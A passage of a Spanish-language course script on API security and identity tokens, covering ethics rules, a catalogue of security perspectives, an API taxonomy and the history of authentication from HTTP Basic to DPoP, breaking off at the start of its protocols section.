# Tokens de identidad, de Basic al DPoP — Clase completa

**Edición extendida: historia, protocolos, ejemplos y diagramas.**

**Guion + explicación + laboratorio de seguridad de APIs**
Versión 2.0 · Foco: seguridad ofensiva *autorizada* y defensa · Incluye el caso ID Uruguay.
Aborda la seguridad de APIs desde **todos los enfoques**: qué se mira, cómo se defiende y para quién.

---

## Índice

- 0. Cómo usar esta clase y reglas de ética/legal
- 1. El mapa completo: todos los enfoques para abordar la seguridad de APIs
- 2. Taxonomía de las APIs: qué estamos protegiendo exactamente
- 3. Historia: de las credenciales al token atado
- 4. Los protocolos involucrados, de HTTP a DPoP
- 5. Módulos técnicos (M1–M11)
- 6. La seguridad de API más allá del token, dominio por dominio
- 7. Laboratorio paso a paso (con ejemplos)
- 8. Glosario de atajos
- 9. Plantilla de reporte responsable
- 10. Bibliografía
- 11. Preguntas frecuentes (FAQ)

## 0. Cómo usar esta clase y reglas de ética/legal

### Cómo está armada
Cada tecnología (Basic → DPoP) se explica con la misma estructura:

1. **Idea** — qué problema resuelve y cuándo nació (primera aparición).
2. **Guion para explicar** — lo que decís en la charla / clase (texto hablado).
3. **Ejemplo que puedo hacer** — algo concreto, reproducible, sin riesgo.
4. **Vulnerabilidades y cómo comprobarlas** — el "modo seguridad": qué puede fallar y cómo se verifica **en un entorno propio o autorizado**.
5. **Defensa** — qué control mitiga ese fallo y con qué norma se referencia.

**Pero la clase no termina en los tokens.** El documento se amplió para cubrir la seguridad de una API **completa**:
- La **Sección 1** presenta *todos* los enfoques posibles para hablar de seguridad de APIs (30 lentes, agrupados en qué se mira, cómo se defiende y para quién).
- La **Sección 2** es una **taxonomía**: qué tipos de API existen (REST, GraphQL, gRPC, eventos, webhooks…) y qué riesgo trae cada uno.
- La **Sección 3** son los **módulos técnicos de tokens** (M1–M11), de Basic al DPoP.
- La **Sección 4** recorre, **dominio por dominio**, todo lo demás que hay que asegurar (autorización, gateway, rate limiting, validación, transporte, inventario, observabilidad, cadena de suministro, cumplimiento, privacidad, anti-patrones…).

### Reglas de ética y legal (leé esto antes de cualquier prueba)

> **Regla de oro:** probá vulnerabilidades únicamente contra (a) sistemas que vos construiste, (b) laboratorios diseñados para ser vulnerables, o (c) sistemas para los que tenés **autorización por escrito** y un alcance definido.
>
> Probar autenticación, robar/reutilizar tokens o manipular identificadores de objetos en sistemas de terceros **sin autorización** es acceso no autorizado y es delito, aunque "sólo sea mirar" o aunque el token lo hayas copiado de tu propio navegador.

Buenas prácticas mínimas:
- **Tu cuenta, tu sesión, tu cliente:** observar tu propio token en tu propio navegador es legítimo; reutilizarlo contra otros recursos o cuentas, no.
- **Alcance escrito:** si vas a probar algo que no es tuyo, pedí permiso y guardá el correo/RFC de autorización.
- **No exfiltrás datos:** si encontrás algo, demostrá el acceso con el mínimo dato necesario (p. ej. tu propio ID), nunca volcás la base.
- **Divulgación responsable:** reportá al dueño del sistema o a su CERT. En Uruguay: **CERTuy (AGESIC)** — https://www.gub.uy/centro-nacional-respuesta-incidentes-seguridad-informatica/
- **Laboratorios recomendados:** OWASP crAPI, DVGA, OWASP Juice Shop, VAmPI, PortSwigger Web Security Academy (labs de JWT y OAuth).

*Herramientas de la clase:* `curl`, navegador con DevTools, Burp Suite Community / ZAP, `jwt_tool`, `PyJWT` (Python), `docker`, `gitleaks`/`ggshield`.

---

## 1. El mapa completo: todos los enfoques para abordar la seguridad de APIs

![Alrededor del token hay un sistema entero: gateway, IAM, MFA y más](img/13_circles.png)

No existe **una** forma de mirar la seguridad de una API. Existen muchas, y cada una ilumina algo distinto y esconde el resto. Esta sección es deliberadamente exhaustiva: primero el catálogo completo de enfoques —agrupados en tres familias según si miran *qué*, *cómo* o *para quién*—, y al final una tabla comparativa y una recomendación de combinación.

**Las tres preguntas que ordenan todo:**
- **Familia A — qué se mira:** el objeto de estudio (arquitectura, actores, datos, estilos, ciclo de vida).
- **Familia B — cómo se defiende:** los mecanismos (autorización, criptografía, tráfico, validación, observabilidad, secretos).
- **Familia C — para quién y por qué:** el contexto (riesgos, gobierno, cumplimiento, privacidad, negocio, madurez).

---

### Familia A — Enfoques según QUÉ se mira

**1.1 Enfoque por capas de arquitectura.**
- *Pregunta central:* ¿en qué capa vive el control y en qué capa vive el atacante?
- *Qué mira:* cliente → red → gateway → autenticación → autorización → lógica de negocio → datos.
- *Cuándo usarlo:* charlas mixtas y diseño; es el más didáctico.
- *Si lo omito:* creo que "arreglé la autenticación" equivale a "arreglé la API".

**1.2 Enfoque por actor: persona, sistema y delegación.**
- *Pregunta central:* ¿quién invoca la API y en nombre de quién?
- *Qué mira:* humano (browser/app), máquina (M2M), y el caso híbrido de un servicio actuando por una persona.
- *Cuándo usarlo:* MFA, identidades no humanas, delegación (OAuth), consentimiento.
- *Si lo omito:* aplico el modelo de la persona a la máquina (pedir "MFA" a un microservicio) o dejo credenciales eternas en CI.

**1.3 Enfoque por ciclo de vida de la credencial.**
- *Pregunta central:* ¿en qué eslabón se puede robar, reutilizar o perpetuar este token?
- *Qué mira:* emisión → transporte → almacenamiento → uso → renovación → revocación → expiración.
- *Cuándo usarlo:* es el enfoque de esta clase; permite hablar de access, refresh e ID token y sus relaciones.
- *Si lo omito:* hablo solo de firma y olvido rotación y revocación, donde ocurren la mayoría de los incidentes.

**1.4 Enfoque por ciclo de vida del software (shift-left).**
- *Pregunta central:* ¿en qué fase del desarrollo se introduce y se detecta el riesgo?
- *Qué mira:* diseño → desarrollo → build/CI → test → despliegue → runtime → retiro/decomisión.
- *Cuándo usarlo:* para mover la seguridad a la izquierda y justificar automatización.
- *Si lo omito:* la seguridad queda como un pentest al final, cuando ya es caro corregir.

**1.5 Enfoque por superficie de ataque.**
- *Pregunta central:* ¿desde dónde me atacan y con qué activo?
- *Qué mira:* cliente (token en JS/localStorage) · red (TLS, proxies) · backend (validación de claims) · cadena de suministro (CI, dependencias) · negocio (abuso de flujos).
- *Cuándo usarlo:* para no subestimar las fugas "aburridas pero reales".
- *Si lo omito:* ignoro que la mayoría de los secretos filtrados son de máquinas, no de personas.

**1.6 Enfoque por dato y contrato.**
- *Pregunta central:* ¿qué datos cruzan la API y qué promete el contrato?
- *Qué mira:* esquema (OpenAPI/AsyncAPI/protobuf/SDL), validación de tipos, campos sensibles, versionado, compatibilidad, contract testing.
- *Cuándo usarlo:* equipos con diseño API-first y catálogo de servicios.
- *Si lo omito:* el contrato y la implementación divergen, y aparecen campos no documentados y "shadow fields".

**1.7 Enfoque por estilo de API.**
- *Pregunta central:* ¿cómo cambian los riesgos según el paradigma (REST, GraphQL, gRPC, SOAP, WebSocket, webhooks)?
- *Qué mira:* cada estilo tiene su clase de riesgo: sobre-fetch y query depth en GraphQL; métodos y enums por defecto en gRPC; XML y firma en SOAP; canales persistentes y autorización por mensaje en WebSocket; SSRF y firmas de webhook.
- *Cuándo usarlo:* cuando la organización usa más de un estilo (casi siempre).
- *Si lo omito:* aplico recetas de REST a GraphQL o a eventos y dejo huecos.
- *Ver detalle:* Sección 2, "Taxonomía de las APIs".

**1.8 Enfoque por protocolo y transporte.**
- *Pregunta central:* ¿qué garantiza (y qué no) el canal?
- *Qué mira:* HTTP/1.1, HTTP/2, HTTP/3/QUIC, TLS, mTLS, cabeceras, CORS, HSTS, PN.
- *Cuándo usarlo:* cuando hay mTLS, service mesh, proxies que terminan TLS o clientes legacy.
- *Si lo omito:* asumo cifrado extremo a extremo donde hay terminación en un proxy.

**1.9 Enfoque por tipo de consumidor.**
- *Pregunta central:* ¿la API es para mi propio front, para un partner, para el público o para uso interno?
- *Qué mira:* first-party (SPA/móvil), interno (servicio a servicio), partner (contratos bilaterales), público/open (sin relación previa), marketplace de terceros.
- *Cuándo usarlo:* para elegir el esquema de identidad y el nivel de confianza correcto.
- *Si lo omito:* trato igual a un socio contractual y a un cliente anónimo de Internet.

**1.10 Enfoque por modelo de despliegue.**
- *Pregunta central:* ¿dónde corre la API y qué cambia en cada modelo?
- *Qué mira:* monolito, microservicios, serverless/funciones, edge, contenedores, service mesh, on-prem, nube, híbrido/multi-nube.
- *Cuándo usarlo:* arquitecturas distribuidas y migraciones a la nube.
- *Si lo omito:* aplico supuestos de red plana a un entorno con malla, sidecars y tráfico este-oeste.

**1.11 Enfoque por tipo de identidad (humana vs. no humana).**
- *Pregunta central:* ¿cuántas identidades de máquina tengo frente a las humanas?
- *Qué mira:* NHIs (service accounts, CI tokens, workloads, dispositivos), su ciclo de vida y su rotación.
- *Cuándo usarlo:* cuando el grueso del tráfico es M2M (la mayoría de las APIs).
- *Si lo omito:* las NHIs quedan sin dueño ni rotación, y son las que más se filtran.

---

### Familia B — Enfoques según CÓMO se defiende

**1.12 Enfoque por paradigma de confianza.**
- *Pregunta central:* ¿confío en *quién sos* (identidad) o en *qué tenés* (posesión/capability)?
- *Qué mira:* ACL vs. capabilities, perimetral vs. Zero Trust, identidad vs. posesión.
- *Cuándo usarlo:* para dar profundidad y justificar DPoP/mTLS.
- *Si lo omito:* no entiendo por qué "robar el token" es un ataque completo.

**1.13 Enfoque por modelo de autorización.**
- *Pregunta central:* ¿cómo se decide si esta identidad puede hacer esta acción sobre este objeto?
- *Qué mira:* RBAC, ABAC, ReBAC, PBAC, policy-as-code (p. ej. OPA), autorización a nivel de objeto y de función.
- *Cuándo usarlo:* siempre que haya objetos por usuario (casi siempre).
- *Si lo omito:* la autenticación funciona y la autorización no; ahí vive BOLA.

**1.14 Enfoque criptográfico y de gestión de claves.**
- *Pregunta central:* ¿qué firma, qué cifra y quién custodia las claves?
- *Qué mira:* JOSE (JWS/JWE/JWK/JWA), PKI, mTLS, KMS/HSM, rotación de claves, criptografía poscuántica.
- *Cuándo usarlo:* diseño de confianza técnica y cumplimiento.
- *Si lo omito:* claves de larga vida, algoritmos débiles y firmas mal validadas.

**1.15 Enfoque por control de tráfico.**
- *Pregunta central:* ¿qué límites y políticas aplico al caudal?
- *Qué mira:* gateway, rate limiting, cuotas, throttling, concurrencia, bot management, geo/IP policy.
- *Cuándo usarlo:* abuso, scraping, fuerza bruta, protección de disponibilidad.
- *Si lo omito:* una API costosa se convierte en un vector de denegación de servicio barato.

**1.16 Enfoque por validación y saneamiento.**
- *Pregunta central:* ¿confío en la entrada? (correcto: no).
- *Qué mira:* inyección (SQL/NoSQL/comandos), SSRF, XXE, deserialización insegura, mass assignment, plantillas, type confusion.
- *Cuándo usarlo:* revisión de código y pruebas ofensivas.
- *Si lo omito:* el token es impecable y la API es inyectable.

**1.17 Enfoque por observabilidad y respuesta.**
- *Pregunta central:* ¿cómo sé que algo pasa, y qué hago cuando pasa?
- *Qué mira:* logs, trazas, métricas, SIEM, detección de anomalías, revocación, respuesta a incidentes.
- *Cuándo usarlo:* operación y seguridad conjuntas.
- *Si lo omito:* un token robado se usa durante semanas sin que nadie lo note.

**1.18 Enfoque por secretos, identidad de máquina y cadena de suministro.**
- *Pregunta central:* ¿dónde viven los secretos y quién los controla?
- *Qué mira:* secret managers, rotación, escaneo de repos/CI, SBOM/SCA, seguridad del pipeline, terceros.
- *Cuándo usarlo:* cuando hay CI/CD y dependencias externas (siempre).
- *Si lo omito:* los secretos terminan en un repo público y las dependencias introducen el próximo Codecov.

---

### Familia C — Enfoques según PARA QUIÉN y POR QUÉ

**1.19 Enfoque por OWASP API Security Top 10.**
- *Pregunta central:* ¿cuál de los diez riesgos tengo hoy y cómo lo pruebo?
- *Qué mira:* BOLA, Broken Authentication, BOPLA, consumo sin límites, BFLA, flujos de negocio, SSRF, misconfiguración, inventario, consumo inseguro.
- *Cuándo usarlo:* auditoría práctica y priorización.
- *Si lo omito:* me quedo en la teoría de tokens sin cubrir autorización, negocio ni configuración.

**1.20 Enfoque por framework de threat modeling.**
- *Pregunta central:* ¿qué puede salir mal en este diseño, sistemáticamente?
- *Qué mira:* STRIDE, LINDDUN (privacidad), PASTA, DREAD, árboles de ataque, diagramas de flujo de datos.
- *Cuándo usarlo:* antes de escribir código; en revisiones de diseño.
- *Si lo omito:* resuelvo síntomas y no causas, y repito los mismos errores en cada API.

**1.21 Enfoque por audiencia.**
- *Pregunta central:* ¿a quién le hablo y qué le importa?
- *Qué mira:* devs (cómo lo implemento), arquitectos (cómo lo diseño), seguridad (cómo lo rompo/defiendo), management (cuánto cuesta).
- *Cuándo usarlo:* cualquier charla o documento; define el nivel de detalle.
- *Si lo omito:* pierdo al público por exceso o por defecto de profundidad.

**1.22 Enfoque por cumplimiento y regulatorio.**
- *Pregunta central:* ¿qué me exige la norma y cómo se traduce en controles?
- *Qué mira:* ISO 27001, PCI DSS, NIST, y en Uruguay el marco de AGESIC, la Ley 18.331 y el Decreto 66/025 (con obligación de reporte a CERTuy).
- *Cuándo usarlo:* gobierno, empresas reguladas, sector financiero y salud.
- *Si lo omito:* no puedo traducir "cumplir" en controles concretos de token y de API.

**1.23 Enfoque por privacidad y protección de datos.**
- *Pregunta central:* ¿qué datos personales cruzan la API y con qué base legal?
- *Qué mira:* minimización, PII, consentimiento, retención, residencia, derecho de acceso y supresión.
- *Cuándo usarlo:* cuando hay datos de personas (siempre).
- *Si lo omito:* una API segura puede seguir siendo ilegal por tratar datos de más.

**1.24 Enfoque por modelo de negocio y abuso económico.**
- *Pregunta central:* ¿qué gana un atacante con esta API, más allá de robar datos?
- *Qué mira:* scraping, escalping, abuso de cupones, creación masiva de cuentas, fraude, reventa de datos y de capacidad.
- *Cuándo usarlo:* productos con valor transaccional o de datos.
- *Si lo omito:* protejo la confidencialidad y me comen por el bolsillo con abuso de lógica.

**1.25 Enfoque por madurez y gobierno.**
- *Pregunta central:* ¿en qué nivel estoy y hacia dónde voy?
- *Qué mira:* OWASP SAMM, modelos de madurez, catálogo de APIs, dueño por API, métricas, capacitación, centro de excelencia.
- *Cuándo usarlo:* programas de seguridad y planes a mediano plazo.
- *Si lo omito:* hago acciones sueltas sin un camino de mejora.

**1.26 Enfoque por economía del atacante (modelo de amenaza).**
- *Pregunta central:* ¿cuánto le cuesta al atacante y cuánto me cuesta a mí defenderme?
- *Qué mira:* costo de obtención de credenciales, valor del objetivo, superficie automatizable, ROI del ataque.
- *Cuándo usarlo:* priorizar defensas con mejor relación costo/beneficio.
- *Si lo omito:* invierto donde no duele y dejo abierto lo barato de explotar.

**1.27 Enfoque histórico/evolutivo.**
- *Pregunta central:* ¿por qué cada tecnología nació, qué resolvió y qué dejó abierto?
- *Qué mira:* Basic/Digest → cookies → API keys → OAuth 1.0 → bearer → JWT → OIDC/PKCE → mTLS/DPoP.
- *Cuándo usarlo:* enseñanza de fundamentos y decisiones de arquitectura.
- *Si lo omito:* repito modas sin entender los términos de intercambio.

**1.28 Enfoque académico/formal.**
- *Pregunta central:* ¿qué principios de diseño se están violando?
- *Qué mira:* principios de Saltzer & Schroeder (mínimo privilegio, separación de privilegios, mediación completa, diseño abierto), capabilities, *confused deputy*, *trust boundaries*.
- *Cuándo usarlo:* para dar rigor y citar fuentes primarias.
- *Si lo omito:* discuto herramientas sin principios, y las herramientas cambian; los principios no.

**1.29 Enfoque por resiliencia y disponibilidad.**
- *Pregunta central:* ¿qué pasa cuando algo falla o me saturan?
- *Qué mira:* DoS/DDoS, consumo de recursos, backpressure, circuit breakers, degradación elegante, continuidad.
- *Cuándo usarlo:* APIs críticas y de alto tráfico.
- *Si lo omito:* la seguridad se enfoca en confidencialidad y olvida la disponibilidad como parte de la tríada CIA.

**1.30 Enfoque por anti-patrones.**
- *Pregunta central:* ¿qué errores concretos se repiten en la industria?
- *Qué mira:* catálogo de malas prácticas (token en URL, secreto hardcodeado, autorización solo en el front, `alg` del token, paginación sin límites…).
- *Cuándo usarlo:* como checklist rápido de revisión y para capacitación.
- *Si lo omito:* repito los mismos errores con distinto nombre.

---

### Tabla comparativa de enfoques

| Familia | Enfoque | Pregunta central | Mejor para | Si lo omito… |
|---|---|---|---|---|
| A | Capas de arquitectura | ¿Dónde vive el control? | Arquitectos | Confundo authn con authz |
| A | Actor (persona/sistema/delegación) | ¿Quién invoca? | MFA y M2M | Aplico mal la MFA |
| A | Ciclo de vida de la credencial | ¿En qué eslabón falla? | Charla integral de tokens | Olvido rotar y revocar |
| A | Ciclo de vida del software | ¿En qué fase se detecta? | Shift-left | Seguridad tardía y cara |
| A | Superficie de ataque | ¿Desde dónde atacan? | Cubrir fugas reales | Ignoro CI y repos |
| A | Dato y contrato | ¿Qué promete el contrato? | API-first | Aparecen shadow fields |
| A | Estilo de API | ¿Cómo cambian los riesgos? | Organizaciones multiestilo | Recetas de REST mal aplicadas |
| A | Protocolo y transporte | ¿Qué garantiza el canal? | mTLS, mesh, proxies | Asumo cifrado extremo |
| A | Tipo de consumidor | ¿Para quién es la API? | Elegir identidad y confianza | Trato igual a socio y anónimo |
| A | Modelo de despliegue | ¿Dónde corre? | Distribuido y nube | Supuestos de red plana |
| A | Identidad humana vs. no humana | ¿Cuántas NHIs tengo? | M2M y CI | NHIs sin dueño ni rotación |
| B | Paradigma de confianza | ¿Identidad o posesión? | Profundidad conceptual | No entiendo el riesgo bearer |
| B | Modelo de autorización | ¿Puede hacer esto sobre esto? | Objetos por usuario | Dejo BOLA abierto |
| B | Criptografía y claves | ¿Quién firma y custodia? | Confianza técnica | Claves eternas y débiles |
| B | Control de tráfico | ¿Qué límites aplico? | Abuso y disponibilidad | DoS barato y scraping |
| B | Validación y saneamiento | ¿Confío en la entrada? | Código y pentest | API inyectable |
| B | Observabilidad y respuesta | ¿Cómo lo detecto y actúo? | Operación y SOC | Token robado invisible |
| B | Secretos y cadena de suministro | ¿Dónde viven los secretos? | CI/CD y terceros | Próximo Codecov |
| C | OWASP API Top 10 | ¿Qué riesgo tengo? | Auditoría y priorización | Teoría sin práctica |
| C | Threat modeling | ¿Qué puede salir mal? | Diseño | Síntomas, no causas |
| C | Audiencia | ¿A quién hablo? | Cualquier comunicación | Pierdo al público |
| C | Cumplimiento | ¿Qué me exigen? | Gobierno y regulado | Norma sin control |
| C | Privacidad | ¿Qué datos trato? | PII | Seguro pero ilegal |
| C | Negocio y abuso | ¿Qué gana el atacante? | Productos transaccionales | Me comen el margen |
| C | Madurez y gobierno | ¿Hacia dónde voy? | Programa de seguridad | Acciones sueltas |
| C | Economía del atacante | ¿Cuánto le cuesta? | Priorizar defensas | Invierto donde no duele |
| C | Histórico/evolutivo | ¿Por qué nació? | Fundamentos | Repito modas |
| C | Académico/formal | ¿Qué principio se viola? | Rigor y citas | Herramienta sin principio |
| C | Resiliencia | ¿Qué pasa si falla? | APIs críticas | Olvido disponibilidad |
| C | Anti-patrones | ¿Qué errores se repiten? | Capacitación y revisión | Mismos errores |

### Recomendación de combinación

Para **una charla o un programa completo** conviene una combinación, no un solo lente:

1. **Enfoque histórico/evolutivo + ciclo de vida de la credencial** para el hilo narrativo (por qué estamos donde estamos).
2. **Enfoque por actor + por modelo de autorización** para el corazón técnico (persona vs. sistema; objeto vs. función).
3. **Enfoque por OWASP API Top 10 + por estilo de API** como atlas de vulnerabilidades y de superficies.
4. **Enfoque por threat modeling + por ciclo de vida del software** para el "cómo se trabaja".
5. **Enfoque por cumplimiento, privacidad y negocio** para el "por qué le importa a la organización".

Esa mezcla es, exactamente, la estructura del resto de este documento: los enfoques son el mapa; las secciones siguientes son el territorio.

## 2. Taxonomía de las APIs: qué estamos protegiendo exactamente

Antes de los tokens conviene saber **de qué estamos hablando** cuando decimos "API". No todas se parecen, y cada familia trae su propia clase de riesgo. Esta sección clasifica las APIs por cinco ejes: estilo, consumidor, despliegue, contrato y tipo de dato. Sirve como índice mental para elegir qué mirar en cada caso.

### 2.1 Por estilo o paradigma

| Estilo | Cómo funciona | Fortalezas | Riesgos característicos |
|---|---|---|---|
| **REST** | Recursos sobre HTTP, verbos, representaciones JSON | Simple, cacheable, ubicuo | BOLA/BFLA, over-fetching, versionado laxo, IDOR por IDs predecibles |
| **GraphQL** | Un endpoint, el cliente pide la forma | Eficiencia de datos, tipado fuerte | Consultas profundas/costosas, *introspection* expuesta, BOLA por resolver, sobre-exposición de campos |
| **gRPC / Protobuf** | RPC binario sobre HTTP/2 | Rendimiento, contrato estricto | Reflexión expuesta, métodos no previstos, falta de inspección por proxies/WAF |
| **SOAP / XML** | Mensajes XML con WSDL | Contrato formal, WS-Security | XXE, WS-Security mal configurado, *entity expansion*, complejidad |
| **WebSocket** | Canal bidireccional persistente | Tiempo real | Autenticación solo al abrir el canal; autorización por mensaje; cross-site hijacking |
| **Webhooks / callbacks** | El proveedor llama a tu URL | Integración push | SSRF, falta de firma (HMAC), replay, URLs no validadas |
| **Event-driven / async** | Colas y tópicos (Kafka, AMQP, SNS/SQS) | Desacople y escala | Autorización por tópico, *event injection*, secretos de broker, datos en claro en el bus |
| **Serverless functions** | Endpoints efímeros (functions) | Escala y costo variable | Configuración por defecto, IAM de la función, inyección de eventos, *cold start* como vector de abuso |

**Regla práctica:** las recetas de REST (validar ID, verbo, rol) **no** se trasladan automáticamente a GraphQL, eventos o WebSocket. Cada estilo exige su propio modelo de autorización.

### 2.2 Por tipo de consumidor

- **First-party:** tus propios front-ends (SPA, móvil). El reto es proteger el artefacto en un cliente que el usuario controla.
- **Interno (servicio a servicio):** tráfico este-oeste. El reto es la identidad de workload y el mínimo privilegio.
- **Partner / B2B:** relación contractual con otra organización. El reto es la federación, la auditoría y el alcance acordado.
- **Público / open API:** sin relación previa con el consumidor. El reto es el abuso, el scraping y la ausencia de contexto de confianza.
- **Marketplace de terceros:** aplicaciones de otros sobre tus datos. El reto es el consentimiento, el alcance y la revocación granular.

### 2.3 Por modelo de despliegue

- **Monolito:** un solo proceso; la seguridad es más simple de razonar y de auditar.
- **Microservicios:** muchos servicios; la autorización debe ser **consistente** en todos, y el tráfico interno también se protege.
- **Serverless:** piezas efímeras; la configuración y los permisos por función son el punto crítico.
- **Edge / CDN:** la ejecución cerca del usuario; cuidado con dónde termina TLS y dónde viven los secretos.
- **Service mesh:** sidecars con mTLS e identidad de workload; cambia dónde se aplican las políticas.
- **On-prem / nube / híbrido / multi-nube:** cambian el perímetro, la residencia de datos y el modelo de identidad.

### 2.4 Por contrato y versionado

- **OpenAPI / Swagger:** contrato de REST; base para validación, documentación y pruebas.
- **AsyncAPI:** el equivalente para eventos y mensajes.
- **GraphQL SDL / protobuf / WSDL:** contratos de sus estilos.
- **Versionado:** en la URL (`/v1`), en cabecera o por *media type*. El riesgo real es el **inventario**: versiones viejas, beta y de prueba que siguen vivas y sin protección (Api9 de OWASP).

### 2.5 Por tipo de dato y dominio

- **PII / datos personales:** sujetos a privacidad y base legal.
- **Financiero:** PCI DSS si hay datos de tarjeta.
- **Salud:** marcos específicos según jurisdicción.
- **Gobierno / identidad ciudadana:** alto impacto; en Uruguay, ID Uruguay y el marco de AGESIC.

> **Cómo se conecta con el resto del documento:** la Sección 1 dice *con qué lente miro*; esta Sección 2 dice *qué estoy mirando*; la Sección 3 (módulos M1–M11) entra en el mundo de los **tokens**; y la Sección 4 recorre, **dominio por dominio**, todo lo demás que hay que asegurar en una API.

## 3. Historia: de las credenciales al token atado

Esta sección cuenta **cómo llegamos hasta acá**. No es un dato de color: cada decisión de diseño
que hoy damos por sentada nació como respuesta a un problema concreto, y casi todos los incidentes
modernos son consecuencias no previstas de esas decisiones. Si entendés **por qué** apareció cada
mecanismo, entendés **dónde** va a fallar.

![Línea de tiempo de la autenticación en APIs, de 1996 a 2025](img/01_timeline.png)

> Nota de método: las fechas son las de **primera aparición pública** del mecanismo (RFC, estándar o
> producto de referencia). Los incidentes se citan como **divulgaciones públicas** y se analizan como
> **fallas de modelo**, nunca como críticas a organizaciones o personas.

### 3.1 Era 1 — La credencial viaja en cada request (1993–1999)

Cuando la web empezó a necesitar "áreas privadas", la solución más simple fue **mandar usuario y
contraseña en cada petición**. Eso es lo que hicieron **HTTP Basic** (concepto de 1993; RFC 1945 en
1996) y su primo **Digest**, que al menos no mandaba la contraseña en claro sino un hash con un
*nonce* (estandarizado en el RFC 2069, 1997, y luego en el RFC 2617, 1999).

- **Qué resolvía:** autenticación mínima, sin estado, sin base de sesiones.
- **Qué no resolvía:** la credencial **viaja una y otra vez**. Si la línea no está cifrada, se lee;
  si está cifrada, igual queda expuesta en el cliente, en los logs y en el servidor. Y no hay forma
  limpia de **delegar** permisos: o sos vos, o no sos nadie.
- **Qué queda hoy:** Basic sobrevive dentro de sistemas internos y como **autenticación de cliente**
  en OAuth (`client_secret_basic`). Digest quedó prácticamente en desuso.

Casi al mismo tiempo —de hecho **antes** de que Digest se estandarizara en 1997—, Netscape inventó la
**cookie** (idea de 1994; especificación pública hacia 1996): un pedacito de estado que el navegador
guarda y reenvía. Con eso nació la **sesión**. La cookie resolvió el problema de "recordar quién sos"
sin repetir la contraseña… y creó dos problemas nuevos para siempre: **CSRF** y **robo de sesión**
(XSS, sniffing). Recién en 2011 se estandarizó (RFC 6265) con los atributos `HttpOnly`, `Secure` y,
más tarde, `SameSite`.

### 3.2 Era 2 — La federación en XML (2002–2005)

Las empresas necesitaban que un empleado autenticado en el directorio corporativo entrara a varias
aplicaciones sin repetir la contraseña. Nació **WS-Security** (OASIS, 2004) y, sobre todo, **SAML 2.0**
(OASIS, 2005): aserciones firmadas digitalmente que viajaban entre el proveedor de identidad y la
aplicación.

- **Qué aportó:** identidad **federada**, **SSO** (una sola sesión para muchas apps) y **firmas** para
  probar que la aserción venía del IdP.
- **Por qué no conquistó el mundo de las APIs:** SAML es **XML**, verboso y pesado para el navegador;
  la gente empezó a usar el navegador entero como transporte de mensajes (el *web SSO profile*), y las
  firmas XML (XML-DSig) tienen una **canonicalización** famosa por ser una fuente inagotable de bugs.
- **Qué queda hoy:** SAML 2.0 vive y es enorme en el mundo **empresarial** (banca, gobierno, SaaS
  corporativo). En APIs de consumo y móviles, su lugar lo ocupó OIDC.

### 3.3 Era 3 — La clave estática (2006 en adelante)

Para que un programa hablara con una API, lo más simple era darle una **API key**: un string largo y
secreto que identifica al cliente. AWS y decenas de proveedores lo popularizaron.

- **Qué resolvió:** identificar **aplicaciones** (no personas) sin montar todo un servidor de identidad.
- **Dónde vive la falla:** la clave **no expira sola**, **no distingue permisos finos** y, si se filtra
  (un repo público, un log, una app móvil descompilada), es **impersonación directa**. Millones de claves
  han aparecido en GitHub, en artículos y en capturas de pantalla.

### 3.4 Era 4 — Firmar cada request (2007–2010)

OAuth 1.0 (borrador de diciembre de 2007; RFC 5849 en 2010) eligió un camino elegante: **no mandar un
token usable**, sino **firmar criptográficamente cada petición** con la clave compartida (HMAC-SHA1),
incluyendo un *nonce* y un *timestamp* para evitar reenvíos.

- **Qué aportó:** un request robado **no se podía reutilizar** sin la clave; no había "bearer" que
  robar.
- **Por qué se abandonó el firmar-por-request:** era **muy difícil de implementar bien** (orden de
  parámetros, canonicalización, relojes), **dependía de la criptografía en el cliente**, y era un
  **calvario para móviles y SPAs**, donde el secreto del cliente no se puede guardar. La comunidad pidió
  algo más simple.

### 3.5 El giro (octubre de 2012): bearer sí, MAC no

OAuth 2.0 (RFC 6749) y el **bearer token** (RFC 6750) llegaron en octubre de 2012 con una consigna:
**simplicidad**. El token pasa a ser una **credencial portadora** —"billete al portador"— que se pone
en la cabecera `Authorization: Bearer …` y listo.

El propio OAuth 2.0 **había definido además el tipo `mac`** (token con prueba de posesión), y hasta
salió un borrador en febrero de 2012. Pero se **abandonó**: exigía canonicalización, era difícil de
interoperar y el mundo prefirió la simplicidad. La consecuencia quedó escrita en la norma:

> **RFC 6749, §10.3:** el servidor de recursos... *no puede* confirmar que el token fue emitido al
> cliente que lo presenta.

Es decir: **por diseño**, quien tiene el token, lo usa. Esa es la frase que resume toda la charla.

### 3.6 La consolidación (2014–2025): ponerle cinturón al bearer

La historia de los últimos diez años es la historia de **atenuar** la propiedad portadora, sin perder la
simplicidad:

| Año | Aporte | Qué agrega |
|---|---|---|
| 2013 | Revocación de tokens (RFC 7009) | cortar antes de la expiración |
| 2014 | OpenID Connect Core 1.0 | identidad (ID token: quién y cómo) sobre OAuth |
| 2015 | JWT (RFC 7519) · PKCE (RFC 7636) · Introspección (RFC 7662) | claims; candado al código; validar tokens opacos |
| 2018 | Token Binding (RFC 8471-8473) | atar el token al canal TLS (sin adopción masiva) |
| 2020 | mTLS atado a certificado (RFC 8705) · JWT BCP (RFC 8725) | tokens *sender-constrained*; reglas de validación JWT |
| 2021 | Perfil JWT para access tokens (RFC 9068) | interoperabilidad; `exp` obligatorio |
| 2023 | DPoP (RFC 9449) | prueba de posesión por request, sin PKI |
| 2025 | RFC 9700 · NIST SP 800-63-4 | mejores prácticas y sender-constrained/PKCE recomendados |

### 3.7 Lo que enseña la historia (cinco moralejas)

1. **Todo token portador es una contraseña portátil.** Si no está atado a su portador, quien lo roba
   entra.
2. **La simplicidad gana primero y cobra después.** El `mac` se descartó por complejo; DPoP volvió a
   traer la prueba de posesión 11 años más tarde.
3. **Cada capa de esta historia sigue viva.** Basic en clientes OAuth, SAML en empresas, API keys en
   servicios internos, cookies en el navegador. No reemplazamos: **apilamos**.
4. **La vida del token importa más que su creación.** La MFA protege la emisión; el daño ocurre durante
   los días o meses en que el token vive.
5. **El token es una sola pieza.** La mayoría de los incidentes no fueron "token roto", sino
   **autorización, validación, configuración o inventario**. De eso trata la sección 6.

## 4. Los protocolos involucrados, de HTTP a DPoP

Esta sección es la **caja de herramientas** de la charla. Para cada protocolo: **qué es**, **cuándo
apareció**, **cómo funciona a grandes rasgos**, **dónde aparece** en la historia de los tokens y **qué
falla** hay que mirar. No hace falta memorizar cada número de RFC; sí entender **qué problema resuelve
cada pieza** y **en qué capa vive**.

![Los protocolos involucrados, agrupados por capas](img/09_protocol_stack.png)

### 4.1 Red y transporte

#### HTTP/1.1, HTTP/2 y HTTP/3 (QUIC)

